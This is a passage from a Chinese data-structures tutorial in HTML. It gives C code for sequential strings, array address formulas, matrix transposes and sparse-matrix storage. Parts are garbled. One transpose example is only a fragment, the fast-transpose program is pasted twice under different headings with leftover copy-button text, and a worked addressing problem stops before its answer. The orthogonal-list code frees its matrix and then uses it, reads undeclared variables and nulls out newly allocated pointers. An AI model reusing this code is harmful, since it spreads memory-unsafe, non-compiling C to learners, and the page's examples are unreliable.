class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// 顺序串的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">char</span> data[MAXSIZE]; <span class="hljs-comment">// 存储空间</span><br>    <span class="hljs-type">int</span> length;         <span class="hljs-comment">// 实际长度</span><br>&#125; SString;<br><br><span class="hljs-comment">// 初始化顺序串</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitString</span><span class="hljs-params">(SString *str)</span> </span>&#123;<br>    str-&gt;length = <span class="hljs-number">0</span>;<br>    str-&gt;data[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// 求子串操作，获取 str 中从 pos 开始长度为 len 的子串，结果保存在 substr 中</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SubString</span><span class="hljs-params">(SString *str, SString *substr, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">0</span> || pos &gt;= str-&gt;length || len &lt; <span class="hljs-number">0</span> || pos + len &gt; str-&gt;length) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;位置或长度不合法\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        substr-&gt;data[i] = str-&gt;data[pos + i];<br>    &#125;<br>    substr-&gt;data[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    substr-&gt;length = len;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入子串操作，将 substr 插入到 str 的 pos 位置</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">InsertString</span><span class="hljs-params">(SString *str, <span class="hljs-type">int</span> pos, SString *substr)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">0</span> || pos &gt; str-&gt;length || str-&gt;length + substr-&gt;length &gt; MAXSIZE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入位置或长度不合法\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 将原串从插入点向后移动</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = str-&gt;length - <span class="hljs-number">1</span>; i &gt;= pos; i--) &#123;<br>        str-&gt;data[i + substr-&gt;length] = str-&gt;data[i];<br>    &#125;<br>    <span class="hljs-comment">// 插入子串</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; substr-&gt;length; i++) &#123;<br>        str-&gt;data[pos + i] = substr-&gt;data[i];<br>    &#125;<br>    str-&gt;length += substr-&gt;length;<br>    str-&gt;data[str-&gt;length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 删除子串操作，从 str 的 pos 位置开始删除 len 长度的字符</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">DeleteString</span><span class="hljs-params">(SString *str, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">0</span> || pos &gt;= str-&gt;length || len &lt; <span class="hljs-number">0</span> || pos + len &gt; str-&gt;length) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除位置或长度不合法\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 将后续的字符前移</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = pos + len; i &lt; str-&gt;length; i++) &#123;<br>        str-&gt;data[i - len] = str-&gt;data[i];<br>    &#125;<br>    str-&gt;length -= len;<br>    str-&gt;data[str-&gt;length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 串连接操作，将 str1 和 str2 连接成 result</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ConcatString</span><span class="hljs-params">(SString *result, SString *str1, SString *str2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (str1-&gt;length + str2-&gt;length &gt; MAXSIZE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;连接后的字符串过长，无法连接\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(result-&gt;data, str1-&gt;data);<br>    <span class="hljs-built_in">strcat</span>(result-&gt;data, str2-&gt;data);<br>    result-&gt;length = str1-&gt;length + str2-&gt;length;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 模式匹配操作，在主串 str 中查找模式串 pattern 的位置，返回首次匹配位置</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IndexOf</span><span class="hljs-params">(SString *str, SString *pattern)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= str-&gt;length - pattern-&gt;length; i++) &#123;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (j &lt; pattern-&gt;length &amp;&amp; str-&gt;data[i + j] == pattern-&gt;data[j]) &#123;<br>            j++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (j == pattern-&gt;length) &#123;<br>            <span class="hljs-keyword">return</span> i; <span class="hljs-comment">// 找到匹配位置</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 未找到匹配</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组是具有相同类型元素的集合，元素在内存中按顺序存储。根据数组维度的不同，数组可以分为一维数组、二维数组和三维数组。</p><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><p>一维数组是一组具有相同类型的变量。数组中的每个元素都有一个索引，索引从0开始。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> arr[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>可以通过索引访问和修改数组中的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">arr[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>; <span class="hljs-comment">// 修改第三个元素的值为10</span><br></code></pre></td></tr></table></figure><h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p>行优先存储</p><p>Loc(i,j)&#x3D;Loc(r,c)+(i−r)×n×xs+(j−c)×xs</p><p>列优先存储方式</p><p>Loc(i,j)&#x3D;Loc(r,c)+(j−c)×m×xs+(i−r)×xs</p><p><code>Loc(i, j)</code>：表示二维数组中元素 <code>A[i][j]</code> 的内存地址。</p><p><code>Loc(r, c)</code>：表示数组的基地址，也就是 <code>A[r][c]</code> 的内存地址。通常情况下，<code>r</code> 和 <code>c</code> 可以取值为 <code>0</code>，即 <code>Loc(0, 0)</code> 为基地址。</p><p><code>j - c</code>：表示 <code>j</code> 列相对于基准列 <code>c</code> 的偏移列数。</p><p><code>m</code>：数组的行数（每列的元素数）。</p><p><code>xs</code>：每个元素占据的存储单元大小（例如 <code>int</code> 类型通常为 <code>4</code> 字节）。</p><p><code>i - r</code>：表示 <code>i</code> 行相对于基准行 <code>r</code> 的偏移行数。</p><p>例子</p><p>设二维数组a[1..60] [2.70]的基地址为2048，每个元素占2个存储单元，若以行优先顺序存储，元素a[32] [58]的地址是</p><h3 id="已知条件"><a href="#已知条件" class="headerlink" title="已知条件"></a>已知条件</h3><ul><li><p><strong>基地址</strong>：2048</p></li><li><p>数组维度</p><p>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>[<span class="hljs-number">1</span>..<span class="hljs-number">60</span>][<span class="hljs-number">2</span>..<span class="hljs-number">70</span>]<br></code></pre></td></tr></table></figure><ul><li>行数：60</li><li>列数：69（从列 2 到列 70，共 69 列）</li></ul></li><li><p><strong>元素大小</strong>：每个元素占 2 个存储单元（即 2 字节）</p></li><li><p><strong>目标元素</strong>：<code>a[32][58]</code></p></li><li><p><strong>存储方式</strong>：行优先存储</p></li></ul><h3 id="行优先存储寻址公式"><a href="#行优先存储寻址公式" class="headerlink" title="行优先存储寻址公式"></a>行优先存储寻址公式</h3><p>在行优先存储中，二维数组的寻址公式为：</p><p>Loc(i,j)&#x3D;Loc(r,c)+(i−r)×n×xs+(j−c)×xs</p><p>其中：</p><ul><li><code>base_address = 2048</code></li><li><code>i = 32</code>（目标行索引）</li><li><code>j = 58</code>（目标列索引）</li><li><code>r = 1</code>（起始行索引）</li><li><code>c = 2</code>（起始列索引）</li><li><code>n = 69</code>（每行的列数）</li><li><code>xs = 2</code>（每个元素的大小）</li></ul><p>二维数组可以看作是数组的数组，通常用于表示矩阵或表格数据。声明一个二维数组的方法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> matrix[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>] = &#123;<br>    &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;,<br>    &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;,<br>    &#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问二维数组元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> value = matrix[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]; <span class="hljs-comment">// 获取第二行第三列的元素</span><br></code></pre></td></tr></table></figure><h4 id="矩阵转置"><a href="#矩阵转置" class="headerlink" title="矩阵转置"></a>矩阵转置</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">    SimpleTranspose(<span class="hljs-built_in">matrix</span>, <span class="hljs-built_in">transpose</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Transposed Matrix:\n&quot;</span>);<br>    PrintMatrix(<span class="hljs-built_in">transpose</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-built_in">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> 三元组表示的稀疏矩阵转置</p><p>这种方法适用于稀疏矩阵，使用三元组表示法，仅存储非零元素的位置和值。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs xl">c复制代码#include &lt;stdio.h&gt;<br><br>#define MAXSIZE <span class="hljs-number">100</span><br><br>typedef struct &#123;<br>    int row;<br>    int col;<br>    int value;<br>&#125; Triple;<br><br>typedef struct &#123;<br>    Triple <span class="hljs-keyword">data</span>[MAXSIZE];<br>    int rows;<br>    int cols;<br>    int len;<br>&#125; TSMatrix;<br><br>void FastTranspose(TSMatrix *A, TSMatrix *B) &#123;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">rows</span> = A-&gt;</span>cols;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">cols</span> = A-&gt;</span>rows;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">len</span> = A-&gt;</span>len;<br><br>    <span class="hljs-function"><span class="hljs-title">int</span> num[A-&gt;</span><span class="hljs-function"><span class="hljs-title">cols</span>], position[A-&gt;</span>cols];<br><br>    <span class="hljs-comment">// Step 1: Initialize num array to count each column&#x27;s non-zero elements</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>cols; i++) num[i] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span><span class="hljs-function"><span class="hljs-title">len</span>; i++) num[A-&gt;</span><span class="hljs-keyword">data</span>[i].col]++;<br><br>    <span class="hljs-comment">// Step 2: Calculate the starting position of each column in B</span><br>    position[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 1; i &lt; A-&gt;</span>cols; i++) &#123;<br>        position[i] = position[i - <span class="hljs-number">1</span>] + num[i - <span class="hljs-number">1</span>];<br>    &#125;<br><br>    <span class="hljs-comment">// Step 3: Place each element of A in the correct position in B</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">int</span> col = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        int pos = position[col]++;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].row = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].col = A-&gt;</span><span class="hljs-keyword">data</span>[i].row;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].value = A-&gt;</span><span class="hljs-keyword">data</span>[i].value;<br>    &#125;<br>&#125;<br><br>void PrintTSMatrix(TSMatrix *M) &#123;<br>    printf(<span class="hljs-string">&quot;row\tcol\tvalue\n&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; M-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">printf</span>(&quot;%d\t%d\t%d\n&quot;, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].row, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].col, M-&gt;</span><span class="hljs-keyword">data</span>[i].value);<br>    &#125;<br>&#125;<br><br>int main() &#123;<br>    TSMatrix A = &#123;&#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>&#125;&#125;, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    TSMatrix B;<br><br>    FastTranspose(&amp;A, &amp;B);<br>    printf(<span class="hljs-string">&quot;Transposed Sparse Matrix in Triple Form:\n&quot;</span>);<br>    PrintTSMatrix(&amp;B);<br><br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> 快速转置算法（适用于稀疏矩阵的快速转置）</p><p>使用快速转置算法，通过辅助数组 <code>num</code> 和 <code>position</code> 来加速转置过程。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs xl">c复制代码#include &lt;stdio.h&gt;<br><br>#define MAXSIZE <span class="hljs-number">100</span><br><br>typedef struct &#123;<br>    int row;<br>    int col;<br>    int value;<br>&#125; Triple;<br><br>typedef struct &#123;<br>    Triple <span class="hljs-keyword">data</span>[MAXSIZE];<br>    int rows;<br>    int cols;<br>    int len;<br>&#125; TSMatrix;<br><br>void FastTranspose(TSMatrix *A, TSMatrix *B) &#123;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">rows</span> = A-&gt;</span>cols;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">cols</span> = A-&gt;</span>rows;<br>    B-&gt;<span class="hljs-function"><span class="hljs-title">len</span> = A-&gt;</span>len;<br><br>    <span class="hljs-function"><span class="hljs-title">int</span> num[A-&gt;</span><span class="hljs-function"><span class="hljs-title">cols</span>], position[A-&gt;</span>cols];<br><br>    <span class="hljs-comment">// Step 1: Initialize num array to count each column&#x27;s non-zero elements</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>cols; i++) num[i] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span><span class="hljs-function"><span class="hljs-title">len</span>; i++) num[A-&gt;</span><span class="hljs-keyword">data</span>[i].col]++;<br><br>    <span class="hljs-comment">// Step 2: Calculate the starting position of each column in B</span><br>    position[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 1; i &lt; A-&gt;</span>cols; i++) &#123;<br>        position[i] = position[i - <span class="hljs-number">1</span>] + num[i - <span class="hljs-number">1</span>];<br>    &#125;<br><br>    <span class="hljs-comment">// Step 3: Place each element of A in the correct position in B</span><br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; A-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">int</span> col = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        int pos = position[col]++;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].row = A-&gt;</span><span class="hljs-keyword">data</span>[i].col;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].col = A-&gt;</span><span class="hljs-keyword">data</span>[i].row;<br>        B-&gt;<span class="hljs-function"><span class="hljs-title">data</span>[pos].value = A-&gt;</span><span class="hljs-keyword">data</span>[i].value;<br>    &#125;<br>&#125;<br><br>void PrintTSMatrix(TSMatrix *M) &#123;<br>    printf(<span class="hljs-string">&quot;row\tcol\tvalue\n&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-title">for</span> (int i = 0; i &lt; M-&gt;</span>len; i++) &#123;<br>        <span class="hljs-function"><span class="hljs-title">printf</span>(&quot;%d\t%d\t%d\n&quot;, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].row, M-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>[i].col, M-&gt;</span><span class="hljs-keyword">data</span>[i].value);<br>    &#125;<br>&#125;<br><br>int main() &#123;<br>    TSMatrix A = &#123;&#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>&#125;&#125;, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    TSMatrix B;<br><br>    FastTranspose(&amp;A, &amp;B);<br>    printf(<span class="hljs-string">&quot;Transposed Sparse Matrix in Triple Form:\n&quot;</span>);<br>    PrintTSMatrix(&amp;B);<br><br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>十字链表法—适用于稀疏矩阵</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xl">typedef struct OLNode <span class="hljs-comment">/*十字链表结点类型定义*/</span><br>&#123;<br>    int row, col; <span class="hljs-comment">/*非零元素的行和列下标*/</span><br>    DataType value; <span class="hljs-comment">/*非零元素所在行表、列表的后继链表*/</span><br>    struct OLNode *right, *down;<br>&#125; OLink;<br>typedef struct<br>&#123;<br>    OLink *row_head, *col_head; <span class="hljs-comment">/*行、列链表的头指针向量*/</span><br>    int m, n, len; <span class="hljs-comment">/*稀疏矩阵的行数、列数、非零元素个数*/</span><br>&#125; CrossList;<br>int CreateCrossList(CrossList *M)<br>&#123;<br>    int i, j;<br>    OLink p, q;<br>    <span class="hljs-comment">/*用十字链表存储结构，创建稀疏矩阵 M*/</span><br>    <span class="hljs-keyword">if</span>(M != NULL) free(M);<br>    scanf(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;m, &amp;n, &amp;len); <span class="hljs-comment">/*输入 M 的行数，列数和非零元素个数*/</span><br>    M-&gt;<span class="hljs-function"><span class="hljs-title">m</span> = m; M-&gt;</span><span class="hljs-function"><span class="hljs-title">n</span> = n; M-&gt;</span>len = len;<br>    <span class="hljs-function"><span class="hljs-title">if</span> ((M-&gt;</span>row_head = (OLink*)malloc(m * sizeof(OLink))) == NULL) exit(OVERFLOW);<br>    <span class="hljs-function"><span class="hljs-title">if</span> ((M-&gt;</span>col_head = (OLink*)malloc(n * sizeof(OLink))) == NULL) exit(OVERFLOW);<br>    M-&gt;<span class="hljs-function"><span class="hljs-title">row_head</span> = M-&gt;</span>col_head = NULL; <span class="hljs-comment">/*初始化行、列头指针向量，各行、列链表为空的链表*/</span><br>    <span class="hljs-keyword">for</span> (scanf(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;i, &amp;j, &amp;e); i != <span class="hljs-number">0</span>; scanf(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;i, &amp;j, &amp;e))<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((p = (OLink*)malloc(sizeof(OLink))) == NULL) exit(OVERFLOW);<br>        <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">row</span> = i; p-&gt;</span><span class="hljs-function"><span class="hljs-title">col</span> = j; p-&gt;</span>value = e; <span class="hljs-comment">/*生成结点*/</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (M-&gt;</span>row_head == NULL)<br>            M-&gt;row_head = p;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-function"><span class="hljs-title">for</span> (q = M-&gt;</span><span class="hljs-function"><span class="hljs-title">row_head</span>; q-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> &amp;&amp; q-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">col</span> &lt; j; q = q-&gt;</span>right);<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span> = q-&gt;</span><span class="hljs-function"><span class="hljs-title">right</span>; q-&gt;</span>right = p; <span class="hljs-comment">/*寻找行表中的插入位置*/</span><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (M-&gt;</span>col_head == NULL)<br>            M-&gt;col_head = p;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-function"><span class="hljs-title">for</span> (q = M-&gt;</span><span class="hljs-function"><span class="hljs-title">col_head</span>; q-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span> &amp;&amp; q-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">row</span> &lt; i; q = q-&gt;</span>down);<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">down</span> = q-&gt;</span><span class="hljs-function"><span 